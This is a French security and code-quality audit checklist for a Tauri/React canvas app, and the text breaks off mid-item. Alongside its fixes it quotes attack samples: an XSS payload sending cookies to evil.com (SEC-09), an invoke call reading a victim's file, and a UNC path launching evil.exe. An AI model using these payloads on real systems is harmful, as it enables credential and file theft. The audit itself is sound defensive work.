# CLEANUP.md — Audit approfondi avant release publique

> Audit méticuleux sur l'état du code à la fin de Phase 5.
> **51 items identifiés**, classés par priorité, avec fichiers et lignes précises.
> **8 vulnérabilités de sécurité critiques** trouvées dans le backend Rust.

## Légende priorités

- 🔴 **CRITIQUE** : bloquant pour release publique (crash, sécurité, fuite mémoire, UX cassée)
- 🟠 **MAJEUR** : significatif sur perf ou maintenabilité long terme
- 🟡 **MINEUR** : amélioration cosmétique ou opportuniste

## Métriques observées

| Métrique | Valeur | Cible |
|---|---|---|
| Lignes TS/TSX totales | 12 121 | — |
| Plus gros fichier | `GlucoseCanvas.tsx` 2 300 lignes | < 500 |
| Nombre de `useEffect` dans GlucoseCanvas | **19** | < 5 par composant |
| `any` / `as any` | 24 occurrences | < 5 |
| `window.addEventListener/dispatchEvent` | **30+ occurrences** | refactorer en bus typé |
| `console.log` oubliés | 0 | 0 ✓ |
| TODO/FIXME dans le code | 0 | < 10 ✓ |
| Tests unitaires | **0** | ≥ 50 |
| Lint config | **absente** | ESLint ou Biome |
| CI workflows | **absent** | GitHub Actions |
| LICENSE | **absent** | MIT ou GPL |
| README à la racine | **absent** | requis |

---

# 🛡️ 0. Sécurité — VULNÉRABILITÉS BACKEND RUST

> Cette section est en tête car ces issues sont bloquantes pour toute publication.
> Le backend Rust expose **7 commandes Tauri** que la couche JS peut invoquer.
> Combinées avec une faille XSS côté front (S-FRONT-01), elles permettent du RCE.

### 🔴 SEC-01 — `read_image_file` accepte n'importe quel chemin sans scope check
**Fichier :** [src-tauri/src/lib.rs:33-43](src-tauri/src/lib.rs#L33-L43)
```rust
#[tauri::command]
async fn read_image_file(path: String) -> Result<String, String> {
    let bytes = tokio::fs::read(&path).await.map_err(|e| e.to_string())?;
    // ...
}
```
**Problème :** Aucune vérification que `path` est dans un scope autorisé. Un script JS malveillant (via XSS Markdown S-FRONT-01) peut appeler `invoke("read_image_file", { path: "C:\\Users\\victim\\Documents\\private.docx" })` et exfiltrer.
**Impact :** **Lecture arbitraire de fichiers du système.** Combiné avec `fetch_image` ou un POST externe → exfiltration silencieuse.
**Fix proposé :**
```rust
fn validate_scope(path: &str, app_handle: &tauri::AppHandle) -> Result<PathBuf, String> {
    let canonical = std::fs::canonicalize(path).map_err(|e| e.to_string())?;
    let allowed_roots = [
        app_handle.path().app_data_dir()?,
        app_handle.path().document_dir()?,
    ];
    if !allowed_roots.iter().any(|root| canonical.starts_with(root)) {
        return Err("Chemin hors du scope autorisé".into());
    }
    Ok(canonical)
}
```
Appliquer à TOUTES les commandes manipulant des paths.
**Effort :** S (helper + 4 sites d'appel)

### 🔴 SEC-02 — `write_project_file` écrit n'importe où
**Fichier :** [src-tauri/src/lib.rs:62-65](src-tauri/src/lib.rs#L62-L65)
```rust
async fn write_project_file(path: String, contents: String) -> Result<(), String> {
    tokio::fs::write(&path, contents).await.map_err(|e| e.to_string())
}
```
**Problème :** Écriture arbitraire. Un attaquant peut écraser `C:\Windows\System32\drivers\etc\hosts` ou des scripts startup.
**Impact :** **Persistance d'attaque, écrasement système, ransomware-like.**
**Fix proposé :** Idem SEC-01 + extension whitelist (`.glucose`, `.json`).
**Effort :** S

### 🔴 SEC-03 — `write_binary_file` même problème
**Fichier :** [src-tauri/src/lib.rs:67-71](src-tauri/src/lib.rs#L67-L71)
**Problème :** Idem SEC-02 mais accepte du base64 → écrit n'importe quel binaire.
**Impact :** **Possibilité de placer un .exe** dans le startup folder.
**Fix proposé :** Scope check + restreindre aux exports légitimes (PNG dans Documents/Pictures).
**Effort :** S

### 🔴 SEC-04 — `open_in_app` lance n'importe quel binaire
**Fichier :** [src-tauri/src/lib.rs:46-52](src-tauri/src/lib.rs#L46-L52)
```rust
async fn open_in_app(path: String) -> Result<(), String> {
    open::that(&path).map_err(|e| ...)
}
```
**Problème :** Pas de validation. Un sticky source malicieusement crafté avec `sourceFile = "C:\\malware.exe"` lance le malware quand l'utilisateur double-clic. Pire : un fichier `.glucose` partagé peut contenir des références à des chemins UNC type `\\attacker.com\share\evil.exe`.
**Impact :** **RCE par fichier .glucose partagé** — scénario réaliste si l'utilisateur télécharge un .glucose d'internet.
**Fix proposé :** Whitelist d'extensions sûres (`.psd, .blend, .kra, .png, .mp4, .pdf, .txt, .md`). Refuser `.exe, .bat, .ps1, .vbs, .scr, .com, .cmd, .msi, .lnk, .url`. Refuser les chemins UNC (`\\...`). Confirmer à l'utilisateur via dialog Tauri pour les premiers ouvrages.
**Effort :** M

### 🔴 SEC-05 — yt-dlp téléchargé d'internet sans vérif checksum
**Fichier :** [src-tauri/src/lib.rs:107-178](src-tauri/src/lib.rs#L107-L178) (`ensure_yt_dlp`)
**Problème :** Le binaire `yt-dlp.exe` est téléchargé depuis `github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp.exe` puis **exécuté directement**. Si :
- Le repo upstream est compromis (cf. cas xz-utils 2024)
- L'utilisateur est sur un réseau MITM (café, hotspot)
- DNS poisoning pointe github vers un attaquant

→ **RCE silencieux**. Le binaire écrit dans `app_data_dir/yt-dlp.exe` est ensuite réutilisé à chaque vidéo.
**Impact :** **Vecteur RCE confirmé.** D'autant plus dangereux qu'on télécharge "latest" → si une nouvelle version backdoorée est publiée, tous les utilisateurs sont infectés à la prochaine vidéo.
**Fix proposé :**
1. Pinner une version exacte (ex. `2024.11.18`)
2. Vérifier SHA256 connu en hardcoded const dans Rust
3. Idéal : bundle `yt-dlp.exe` avec l'app via `tauri.conf.json bundle.resources`
**Effort :** M

### 🔴 SEC-06 — `fetch_image` SSRF + Referer leak
**Fichier :** [src-tauri/src/lib.rs:5-31](src-tauri/src/lib.rs#L5-L31)
**Problème :**
1. Le User-Agent prétend être un Linux WebKit alors qu'on est sur Windows. Bizarre mais bénin.
2. `Referer` envoyé = l'URL elle-même → leak privé si l'URL contient des tokens.
3. Pas de blocage des IPs privées (127.0.0.1, 192.168.x.x, métadonnées cloud `169.254.169.254`).
4. Suit les redirections par défaut → SSRF possible vers internal.

**Impact :** Attaque depuis l'app contre le réseau interne de l'utilisateur (router admin pages, services LAN).
**Fix proposé :**
- Refuser les hostnames qui résolvent vers des IPs privées
- Limiter taille de réponse (10 MB max)
- Configurer `redirect::Policy::limited(3)`
- Mettre un User-Agent honnête : `Glucose/0.2.0`
**Effort :** M

### 🔴 SEC-07 — `assetProtocol.scope = ["**"]` trop permissif
**Fichier :** [src-tauri/tauri.conf.json:28](src-tauri/tauri.conf.json#L28)
```json
"assetProtocol": { "enable": true, "scope": ["**"] }
```
**Problème :** Le protocole `asset://` peut charger n'importe quel fichier de la machine. Combiné avec XSS Markdown → exfiltration.
**Impact :** Bloquant publication.
**Fix proposé :** Scopes explicites :
```json
"scope": [
  "$APPDATA/**",
  "$DOCUMENT/Glucose/**",
  "$DOWNLOAD/**"
]
```
**Effort :** S

### 🔴 SEC-08 — Capabilities Tauri trop larges
**Fichier :** [src-tauri/capabilities/default.json:13-17](src-tauri/capabilities/default.json#L13-L17)
```json
"fs:scope-home-recursive",
"fs:scope-download-recursive",
"fs:scope-document-recursive",
"fs:scope-appdata-recursive"
```
**Problème :** `fs:scope-home-recursive` donne accès à `~` entier (incluant `~/.ssh/id_rsa`, navigateur creds, etc.).
**Impact :** Surface d'attaque énorme pour le plugin `fs`.
**Fix proposé :** Garder uniquement `fs:scope-appdata-recursive` (app data) + scope spécifique `$DOCUMENT/Glucose/**` pour les projets utilisateur. Faire des dialogues `dialog:open` pour sortir de ces scopes ponctuellement.
**Effort :** S

### 🔴 SEC-09 — `rehypeRaw` autorise HTML brut → XSS
**Fichier :** [src/canvas/HtmlAnnotationLayer.tsx:5,28](src/canvas/HtmlAnnotationLayer.tsx#L5)
```tsx
import rehypeRaw from "rehype-raw";
// ...
rehypePlugins={[rehypeKatex, rehypeRaw]}
```
**Problème :** L'utilisateur peut écrire `<img src=x onerror="fetch('http://evil.com/?'+document.cookie)">` dans un sticky → exécution. Combiné avec `invoke()` Tauri exposé → call SEC-01..04 → RCE.
**Impact :** **Vecteur XSS confirmé.** Bloquant.
**Fix proposé :** Retirer `rehypeRaw` ou remplacer par `rehype-sanitize`. Tester avec un texte attaquant.
**Effort :** S

---

# 1. Performance runtime

### 🔴 P-01 — `GlucoseCanvas` god-component (2 300 lignes, 19 useEffect)
**Fichier :** [src/canvas/GlucoseCanvas.tsx](src/canvas/GlucoseCanvas.tsx)
**Problème :** **19 `useEffect`** dans un seul composant aux lignes 114, 169, 248, 291, 320, 331, 337, 346, 400, 411, 452, 531, 547, 586, 597, 640, 678, 920, 2113. Plus init PixiJS, drag, zone-select, ghost, etc. Toute mutation provoque cascade de re-renders.
**Impact :** À chaque frappe utilisateur, React doit ré-évaluer toutes les closures. CPU élevé, frame drops sur projets moyens.
**Fix proposé :** Splitter en hooks dédiés :
- `usePixiApp(canvasRef)` — init/destroy
- `useViewportSync(worldRef)` — pan/zoom + emit
- `useImagesSync(boardImages, worldRef)` — sprites
- `useArrowTool(state)` — création flèche
- `useZoneSelector(state)` — zone-select tool
- `useGhostPreview(state)` — preview ghost
- `useFolderTransitions(state, worldRef)` — Phase 4.5
- `useGlobalListeners(callbacks)` — events `glucose:*`
- `useKeyboardShortcuts()` — fit-view, jump, etc.
- `useExportPng(worldRef)` — export
**Effort :** L

### 🔴 P-02 — `getSymbioticHue` : useMemo invalidé à chaque render
**Fichier :** [src/canvas/HtmlAnnotationLayer.tsx:492](src/canvas/HtmlAnnotationLayer.tsx#L492)
```tsx
const auraHue = useMemo(() => getSymbioticHue(ann, allAnnotations),
  [ann.id, ann.x, ann.y, allAnnotations]);
```
**Problème :** `allAnnotations` est passé en props → nouvelle référence à chaque render parent → memo **toujours invalidé**. La fonction itère sur **toutes** les annotations dans un rayon de 1200px avec cos/sin. Effort gaspillé.
**Impact :** O(n²) sur N=300 annotations = 90k ops par frame potentielle. Catastrophique sur projets larges.
**Fix proposé :** Calculer toutes les hues en une passe au niveau du parent :
```tsx
const huesByAnnId = useMemo(() => computeAllHues(annotations), [annotations]);
// Puis passer huesByAnnId.get(ann.id) à chaque AnnotationItem
```
Ou cacher dans un Map module-level avec clé `(annId, x, y, allAnnIds_signature)`.
**Effort :** M

### 🔴 P-03 — `setCurrentLod(computeLOD(scale))` à chaque frame de pan
**Fichier :** [src/canvas/GlucoseCanvas.tsx:823](src/canvas/GlucoseCanvas.tsx#L823)
**Problème :** `emitViewport` appelle `setCurrentLod` à **chaque** mouvement de souris pendant un pan. Le setter a un guard `if (!== lod) set(...)` donc protège contre les changements inutiles, MAIS `getState().setCurrentLod` est lui-même appelé même si LOD ne change pas. Et `getState()` a un coût.
**Impact :** Mineur (le guard fait son travail) mais surconsommation CPU lors de pan rapide.
**Fix proposé :** Garder le LOD dans une ref + calculer différence avant d'appeler le setter Zustand :
```tsx
const lastLodRef = useRef<LOD>("micro");
// dans emitViewport :
const newLod = computeLOD(world.scale.x);
if (newLod !== lastLodRef.current) {
  lastLodRef.current = newLod;
  useGlucoseStore.getState().setCurrentLod(newLod);
}
```
**Effort :** S

### 🔴 P-04 — Quadtree existe mais utilisé seulement pour images
**Fichier :** [src/canvas/Quadtree.ts](src/canvas/Quadtree.ts) + utilisé via `SpatialHash` uniquement à `applyCulling()` (`GlucoseCanvas.tsx:801`)
**Problème :** Annotations, flèches, dossiers, membranes ne sont **jamais cullés**. À 1000+ annotations, on rend tout, hors-viewport inclus.
**Impact :** Perf catastrophique sur gros projets — incompatible avec la cible "logiciel grand public sur PC modeste".
**Fix proposé :**
1. Étendre `SpatialHash` aux annotations + dossiers
2. Calculer les bounds visibles dans `ArrowSvgLayer`, `HtmlAnnotationLayer`, `FolderSvgLayer` via `vpRef`
3. Filtrer la liste avant `.map()` au render
4. Recalculer le hash uniquement sur changement structurel (pas sur pan/zoom — c'est la viewport qui filtre, pas le hash)
**Effort :** M

### 🔴 P-05 — `fitView` crash potentiel sur >100k éléments
**Fichier :** [src/canvas/GlucoseCanvas.tsx:878-879](src/canvas/GlucoseCanvas.tsx#L878-L879)
```tsx
const minX = Math.min(...xs), maxX = Math.max(...xs);
```
**Problème :** Le spread operator a une limite ~ 2^16 arguments selon le moteur. À 65k+ valeurs → "Maximum call stack size exceeded".
**Impact :** Crash garanti sur très gros projets, scénario peu réaliste mais bloquant si atteint.
**Fix proposé :** Itération directe :
```tsx
let minX = Infinity, maxX = -Infinity;
for (const x of xs) { if (x < minX) minX = x; if (x > maxX) maxX = x; }
```
**Effort :** S

### 🟠 P-06 — `nodeDomains` recalculé à chaque render de ArrowSvgLayer
**Fichier :** [src/canvas/ArrowSvgLayer.tsx:380-396](src/canvas/ArrowSvgLayer.tsx#L380-L396) (Phase 3)
**Problème :** Index `Map<string, Set<string>>` reconstruit à chaque render dans l'IIFE. Dépendance : tout `board.annotations` + `board.images`.
**Fix proposé :** `useMemo(() => buildNodeDomainsIndex(board), [board.annotations, board.images])`.
**Effort :** S

### 🟠 P-07 — Allocations dans `applyCulling`
**Fichier :** [src/canvas/GlucoseCanvas.tsx:801-813](src/canvas/GlucoseCanvas.tsx#L801-L813)
**Problème :** `spatialHashRef.current.queryIds()` retourne un nouveau `Set<string>` à chaque frame. À 60 FPS = 60 sets/s.
**Impact :** Pression GC.
**Fix proposé :** Réutiliser un `Set` interne au `SpatialHash`, le `clear()` à chaque appel.
**Effort :** S

### 🟠 P-08 — Selectors Zustand instables
**Fichier :** Multiples — exemples : [src/canvas/HtmlAnnotationLayer.tsx](src/canvas/HtmlAnnotationLayer.tsx) (`useGlucoseStore(s => s.project.domains)` puis `?? []`), `useGlucoseStore()` sans selector dans plusieurs composants.
**Problème :** `useGlucoseStore()` sans selector subscribe à TOUT le store → toute action déclenche un re-render même si la valeur lue n'a pas changé.
**Fix proposé :** Sélecteurs explicites partout. Avec `shallow` pour les arrays.
**Effort :** M

### 🟠 P-09 — Cleanup ResizeObserver après LOD désactivé
**Fichier :** [src/canvas/HtmlAnnotationLayer.tsx:80-114](src/canvas/HtmlAnnotationLayer.tsx#L80-L114)
**Problème :** Le `ResizeObserver` ne persiste les dimensions QU'EN MICRO (Phase 2). Avec LOD désactivé temporairement (`lod.ts:15`), tous les renders sont en micro → comportement OK actuellement, mais quand le LOD sera réactivé, vérifier qu'on ne perd pas les dimensions sur projet existant.
**Fix proposé :** À tester runtime quand LOD réactivé.
**Effort :** S

### 🟡 P-10 — `FolderPreview` re-render à chaque pan
**Fichier :** [src/canvas/FolderSvgLayer.tsx:333-396](src/canvas/FolderSvgLayer.tsx#L333-L396)
**Problème :** Calcule la bounding box du child board à chaque render parent. Pas memoïsé. Le calcul itère sur tous les images + annotations + folders du child.
**Fix proposé :** `React.memo(FolderPreview)` + `useMemo` sur les items normalisés.
**Effort :** S

---

# 2. Mémoire & cycles de vie

### 🔴 M-01 — PixiJS sprites : memory leak sur board switch rapide
**Fichier :** [src/canvas/GlucoseCanvas.tsx:262-290](src/canvas/GlucoseCanvas.tsx#L262-L290)
**Problème :** `Assets.load(img.src)` est `await` → si l'utilisateur change de board pendant le chargement, le sprite est créé après le board switch. Le check `if (!worldRef.current || spritesRef.current.has(img.id))` filtre seulement les cas évidents. La texture peut être créée puis jamais ajoutée.
**Impact :** Textures GPU jamais libérées sur navigation rapide entre boards lourds.
**Fix proposé :** AbortController par image + check `id appartient toujours au board courant` après `await`.
**Effort :** M

### 🟠 M-02 — `setHoveredNodeId(null)` race condition
**Fichier :** [src/canvas/HtmlAnnotationLayer.tsx](src/canvas/HtmlAnnotationLayer.tsx) ~ligne 700
**Problème :** Si l'utilisateur passe rapidement de A à B, `onMouseLeave A` peut se déclencher APRÈS `onMouseEnter B`, écrasant le hover sur B.
**Impact :** Anti-spaghetti des flèches peut clignoter.
**Fix proposé :**
```tsx
onMouseLeave={() => setHoveredNodeId(prev => prev === ann.id ? null : prev)}
```
Mais Zustand setter ne supporte pas la fonction. Faire un `if (getState().hoveredNodeId === ann.id) set(null)`.
**Effort :** S

### 🟠 M-03 — `_pomInterval` global jamais nettoyé
**Fichier :** [src/store/index.ts:121](src/store/index.ts#L121)
**Problème :** Variable module-level. En hot reload (dev), le timer ne s'arrête pas.
**Fix proposé :** Hook `beforeunload` qui appelle `pomodoroPause()`. Ou utiliser un Web Worker dédié.
**Effort :** S

### 🟠 M-04 — Double event listeners dans StrictMode dev
**Fichier :** Multiple `useEffect` avec `window.addEventListener`
**Problème :** En StrictMode, mount/unmount/mount → certains listeners sont attachés/détachés deux fois. Pendant le détacher, des events peuvent traverser.
**Fix proposé :** Vérifier que TOUS les `addEventListener` ont leur cleanup `return () => removeEventListener`. Audit au grep.
**Effort :** S

### 🟡 M-05 — `lastClickRef` jamais TTL
**Fichier :** [src/canvas/HtmlAnnotationLayer.tsx:41](src/canvas/HtmlAnnotationLayer.tsx#L41)
**Problème :** Track double-click via timestamp 350ms. Persiste indéfiniment.
**Fix proposé :** TTL 500ms via setTimeout reset.
**Effort :** S

---

# 3. Propreté du code

### 🔴 C-01 — Badge ↻ miroir dupliqué 3 fois dans HtmlAnnotationLayer
**Fichier :** [src/canvas/HtmlAnnotationLayer.tsx:736-757, 829-850, 953-974](src/canvas/HtmlAnnotationLayer.tsx#L736)
**Problème :** Le même `<button>` ↻ avec exactement les mêmes styles est copié-collé dans le rendu text, sticky standard, et sticky-opérateur. ~22 lignes × 3 = 66 lignes de duplication.
**Impact :** Risque de divergence sur modification (déjà observé sur sticky-opérateur où j'ai dû refaire le copier-coller).
**Fix proposé :** Extraire dans `src/canvas/AnnotationBadges.tsx` :
```tsx
export function MirrorBadge({ mirrorOf }: { mirrorOf?: string }) { ... }
export function DomainBadges({ badges }: { badges: ResolvedBadge[] }) { ... }
```
**Effort :** S

### 🔴 C-02 — `getSymbioticHue` mal placé
**Fichier :** [src/canvas/HtmlAnnotationLayer.tsx:364-454](src/canvas/HtmlAnnotationLayer.tsx#L364-L454)
**Problème :** Fonction pure de 90 lignes exportée depuis un fichier de couche React. Importée par `ArrowSvgLayer.tsx:4` et `ArrowTextEditor.tsx:3`. Couplage circulaire potentiel.
**Fix proposé :** Déplacer dans `src/canvas/symbioticHue.ts`. Tests unitaires possibles.
**Effort :** S

### 🟠 C-03 — 24 occurrences de `any` / `as any`
**Catégorisation :**
- **PixiJS sprite tagging** (8) : `(sprite as any)._selGfx`, `(h as any)._handlePart`, `(btn as any)._zoneAction`. Pattern fragile mais nécessaire pour PixiJS legacy.
  → Remplacer par WeakMap : `const selGfxBySprite = new WeakMap<Sprite, Graphics>();`
- **`obstacles: any[]`** : [ArrowSvgLayer.tsx:40,239](src/canvas/ArrowSvgLayer.tsx#L40)
  → Définir `interface Obstacle { left: number; right: number; top: number; bottom: number; id: string; }`
- **`hoveredBlocks: any, previewTarget: any`** : [HtmlAnnotationLayer.tsx:480-481](src/canvas/HtmlAnnotationLayer.tsx#L480)
  → Type explicite `HoveredBlock` et `PreviewTarget`.
- **`{ ...ann, x: pts[0].x } as any`** : [ArrowSvgLayer.tsx:443-444](src/canvas/ArrowSvgLayer.tsx#L443)
  → `getSymbioticHue` accepte `Annotation` mais on lui passe une fausse annotation. Refacto signature : `getSymbioticHue(seed: { id: string; x: number; y: number }, ...)`.
- **`} as any}` style inline** : [HtmlAnnotationLayer.tsx:719](src/canvas/HtmlAnnotationLayer.tsx#L719)
  → Variables CSS custom : utiliser `--aura-color` via `style={{ "--aura-color": auraColor } as React.CSSProperties}`.
**Effort :** M

### 🟠 C-04 — Magic numbers partout
**Exemples concrets :**
- `RAYON = 1200` : [HtmlAnnotationLayer.tsx:404](src/canvas/HtmlAnnotationLayer.tsx#L404)
- `CLUSTER_DIST = 600` : [MembraneRenderer.ts:5](src/canvas/MembraneRenderer.ts#L5)
- `OFFSET = 40` mirror : [App.tsx](src/App.tsx)
- Délais animation `400ms`, `180ms`, `350ms` épars
- Seuils LOD `0.25`, `0.55` : [lod.ts:9-10](src/canvas/lod.ts#L9)
- `MIN_SCALE = 0.02`, `MAX_SCALE = 20` : [GlucoseCanvas.tsx:29-30](src/canvas/GlucoseCanvas.tsx#L29)
- `PAD = 32` pathfinding : [ArrowSvgLayer.tsx:55](src/canvas/ArrowSvgLayer.tsx#L55)

**Fix proposé :** `src/constants.ts` avec sections nommées :
```tsx
export const VIEWPORT = { MIN_SCALE: 0.02, MAX_SCALE: 20 } as const;
export const TIMING = { ANIM_FOLDER: 400, ANIM_PANEL: 180, DOUBLE_CLICK: 350 } as const;
export const CLUSTERING = { CLUSTER_DIST: 600, MEMBRANE_PAD: 80 } as const;
export const SYMBIOSIS = { RADIUS: 1200 } as const;
export const PATHFINDING = { OBSTACLE_PAD: 32, MAX_DEPTH: 10 } as const;
export const MIRROR = { OFFSET: 40, FIND_SAFETY: 16 } as const;
```
**Effort :** M

### 🟠 C-05 — Naming bilingue (fr/en mix)
**Exemples :** `zoneStartRef`, `pStartX` (anglais) vs `zonePendingActionRef`, `couleurDuDossier` (français), commentaires majoritairement français + types anglais.
**Impact :** Inconfort pour contributeurs non-francophones. Pour un projet open-source, l'anglais est attendu sur le code.
**Fix proposé :** Standardiser : code/identifiants/commentaires en **anglais**, strings UI en français (puis i18n). À faire en plusieurs PRs ciblées.
**Effort :** L

### 🟠 C-06 — Store monolithique 988 lignes
**Fichier :** [src/store/index.ts](src/store/index.ts)
**Problème :** Un seul `create<GlucoseStore>` mêlant : annotations, images, presets, domaines, miroirs, folders, LOD, UI, hover, panel droit, Pomodoro, smart guides, history, viewport.
**Impact :** Mauvaise lisibilité, sélecteurs naturellement plus larges que nécessaire.
**Fix proposé :** Slices :
- `src/store/slices/canvas.ts` (annotations + images)
- `src/store/slices/folders.ts`
- `src/store/slices/domains.ts`
- `src/store/slices/mirrors.ts`
- `src/store/slices/ui.ts` (LOD, hover, panel)
- `src/store/slices/pomodoro.ts`
- `src/store/slices/history.ts` (undo/redo)
- `src/store/index.ts` combine via `(...a) => ({ ...createCanvasSlice(...a), ... })`
**Effort :** L

### 🟡 C-07 — Imports React 19 inutiles
**Fichier :** Plusieurs composants importent `React` sans l'utiliser.
**Fix proposé :** Audit `grep -l "import React" src/` puis suppression. ESLint `react/jsx-uses-react: off` pour le runtime jsx-react.
**Effort :** S

### 🟡 C-08 — Commentaires français redondants avec le code
**Exemples :** `// Couleur du dossier` au-dessus de `color: folder.color`. Le code est auto-explicatif.
**Fix proposé :** Audit + suppression des commentaires "narratifs". Garder uniquement les "WHY".
**Effort :** S

---

# 4. Architecture

### 🔴 A-01 — Event-bus implicite via `window.dispatchEvent` (30+ usages)
**Fichiers :** GlucoseCanvas (12 emit/listen), HtmlAnnotationLayer (4), ArrowSvgLayer (4), Minimap (3), App (3), FolderSvgLayer (3), Toolbar (1), PresetPanel (4), SearchPanel (1), StoryboardControls (3), ArrowTextEditor (1), ArrowDescriptionPanel (1).

**14+ events** : `glucose:viewport-changed`, `glucose:hover-arrow`, `glucose:arrow-target-preview`, `glucose:teleport-to-mirror-original`, `glucose:open-arrow-description`, `glucose:portal-jump`, `glucose:layout-preview`, `glucose:zone-selected`, `glucose:fit-view`, `glucose:export-png`, `glucose:jump-viewport`, `glucose:pan-viewport-to`, `glucose:zoom-to-annotation`, `glucose:delete-selected-folder`.

**Problème :** Communication via `window` global, **pas typée**, **pas auditable**, fragile en StrictMode (double listeners). Difficile de retracer qui écoute quoi.
**Fix proposé :** Module `src/utils/glucoseBus.ts` typé :
```tsx
type EventMap = {
  "viewport-changed": { x: number; y: number; scale: number };
  "teleport-to-mirror-original": { mirrorOf: string; type: "annotation" | "image" | "folder" };
  // ... tous les autres
};

export const bus = createBus<EventMap>();
// bus.emit("teleport-to-mirror-original", { mirrorOf, type });
// bus.on("teleport-to-mirror-original", (payload) => ...);
```
**Effort :** M

### 🟠 A-02 — Couplage `dropHandler` ↔ store ↔ I/O
**Fichier :** [src/canvas/dropHandler.ts](src/canvas/dropHandler.ts)
**Problème :** Détection vidéo, fetch yt-dlp, conversion, ajout au store mélangés.
**Fix proposé :** Splitter en `src/io/videoImport.ts`, `src/io/imageImport.ts`. `dropHandler` orchestre uniquement.
**Effort :** M

### 🟠 A-03 — Utilitaires éparpillés
**Problème :** `src/utils/` contient nanoid, cursorWrap, layout, project. Mais `dropHandler.ts` est dans `canvas/` alors que c'est de l'I/O. `MembraneRenderer` mélange algorithme convex hull + rendu PixiJS.
**Fix proposé :** Restructure :
- `src/algos/` (convexHull, unionFind, getDynamicRoute, computeLOD, mirrorGraph)
- `src/canvas/` (renderers PixiJS et SVG, hooks)
- `src/io/` (file, video, image, project)
- `src/components/` (UI)
- `src/store/` (slices)
- `src/utils/` (vraiment génériques)
**Effort :** M

### 🟠 A-04 — Pas de séparation Domain/Persistance
**Problème :** Les types `Annotation`, `BoardImage`, etc. sont à la fois le format runtime ET le format de persistance. Toute évolution casse les anciens fichiers `.glucose`.
**Fix proposé :** Schéma versionné `ProjectV1`, `ProjectV2` + `migrate(v: any) → ProjectV2`. Validation via Zod.
**Effort :** L

---

# 5. Robustesse / edge cases

### 🔴 R-01 — `loadProject` accepte des projets corrompus sans validation
**Fichier :** [src/store/index.ts:863-870](src/store/index.ts#L863-L870)
```tsx
loadProject: (project) => set({
  project: { ...project, domains: project.domains ?? [] },
  // ...
}),
```
**Problème :** Aucune validation de structure. Un fichier `.glucose` malformé (clés manquantes, types invalides, IDs dupliqués) cause un crash React lors du premier render.
**Impact :** **Bloquant release** : un fichier corrompu = perte d'accès à l'app.
**Fix proposé :** Validation Zod + fallback gracieux :
```tsx
import { z } from "zod";
const ProjectSchema = z.object({ ... });
loadProject: (raw) => {
  const result = ProjectSchema.safeParse(raw);
  if (!result.success) {
    showToast("Fichier corrompu", "⚠");
    return; // garde l'ancien projet
  }
  set({ project: result.data, ... });
}
```
**Effort :** M

### 🔴 R-02 — Pas de garde-fous coordonnées extrêmes
**Problème :** L'utilisateur peut zoomer à `scale = MIN_SCALE = 0.02`, créer des nœuds à `x = 1e15`. Erreurs PixiJS Float32 (NaN), perte de précision.
**Fix proposé :**
- Clamp `scale` dans `[MIN_SCALE, MAX_SCALE]` au moment du `world.scale.set` (déjà partiellement fait)
- Border `±100000` sur création de nœud (ou alerte)
- `setViewport(boardId, vp)` : valider `vp.x/y` finis et bornés
**Effort :** S

### 🔴 R-03 — `findOriginalAnnotation` suit chaîne sans alerter
**Fichier :** [src/store/index.ts:712-728](src/store/index.ts#L712-L728)
**Problème :** Garde-fou de 16 sauts présent mais aucun warning si atteint. Mirror→mirror→mirror chain silencieuse.
**Fix proposé :** `console.error("[findOriginalAnnotation] Chain too deep, possible cycle: " + id)` + toast.
**Effort :** S

### 🟠 R-04 — Race PixiJS init / unmount StrictMode
**Fichier :** [src/canvas/GlucoseCanvas.tsx:166-228](src/canvas/GlucoseCanvas.tsx#L166-L228)
**Problème :** Try/catch sur destroy ajouté (Phase 4), mais pendant init, des effets peuvent setHoveredNodeId, etc. avec un app non-prêt.
**Fix proposé :** Sentinel `if (!appRef.current) return` dans tous les useEffect dépendants.
**Effort :** S

### 🟠 R-05 — Pas de limite sur taille text/sticky
**Problème :** Coller 10 MB de texte dans un sticky → ReactMarkdown rendra tout, bloquant l'UI.
**Fix proposé :** Tronquer à 50 KB par bloc + warning "Texte tronqué".
**Effort :** S

### 🟠 R-06 — `download_video` sans timeout
**Fichier :** [src-tauri/src/lib.rs:73-104](src-tauri/src/lib.rs#L73-L104)
**Problème :** `yt-dlp` peut hanger indéfiniment sur un site mort. Pas de timeout, pas d'annulation.
**Fix proposé :** `tokio::time::timeout(Duration::from_secs(300), ...)` + UI bouton annuler.
**Effort :** M

### 🟡 R-07 — `fitView` retourne sans message si rien à cadrer
**Fichier :** [src/canvas/GlucoseCanvas.tsx:877](src/canvas/GlucoseCanvas.tsx#L877)
```tsx
if (xs.length === 0) return;
```
**Fix proposé :** Toast "Rien à afficher" pour confirmer l'action.
**Effort :** S

---

# 6. Build / packaging

### 🔴 B-01 — Bundle JS non splitté (1,33 MB en un seul fichier)
**Fichier :** Build output, [vite.config.ts](vite.config.ts)
**Problème :** Le build vite a sorti `index-DI2DrK-l.js  1,333.08 kB` avec warning "Some chunks are larger than 500 kB". Tout est chargé au démarrage.
**Impact :** Démarrage lent sur PC modeste, mémoire JS plus grosse.
**Fix proposé :**
```tsx
// vite.config.ts
build: {
  rollupOptions: {
    output: {
      manualChunks: {
        'vendor-react': ['react', 'react-dom'],
        'vendor-pixi': ['pixi.js'],
        'vendor-markdown': ['react-markdown', 'remark-gfm', 'remark-math', 'rehype-katex'],
        'katex': ['katex'],
      },
    },
  },
},
```
**Effort :** S

### 🟠 B-02 — Lazy-loading absent pour les panels
**Problème :** `DomainsPanel`, `PresetPanel`, `OrganizePanel`, `StoryboardControls`, `Minimap`, `ColorPicker`, `ArrowDescriptionPanel`, `ArrowTextEditor`, `SearchPanel` sont importés statiquement. Tous chargés au démarrage.
**Fix proposé :** `React.lazy(() => import("./components/DomainsPanel"))` + `<Suspense>`.
**Effort :** S

### 🟠 B-03 — KaTeX (250 KB CSS + JS) chargé sans usage détecté
**Fichier :** [src/canvas/HtmlAnnotationLayer.tsx:7](src/canvas/HtmlAnnotationLayer.tsx#L7)
```tsx
import "katex/dist/katex.min.css";
```
**Problème :** Importé statiquement, chargé dès le démarrage même si aucune annotation ne contient de LaTeX.
**Fix proposé :** Import dynamique au premier render Markdown contenant `$` :
```tsx
useEffect(() => {
  if (text.includes("$")) import("katex/dist/katex.min.css");
}, [text]);
```
**Effort :** M

### 🟠 B-04 — Cargo deps : `reqwest blocking` + `tokio full` lourds
**Fichier :** [src-tauri/Cargo.toml](src-tauri/Cargo.toml)
**Problème :**
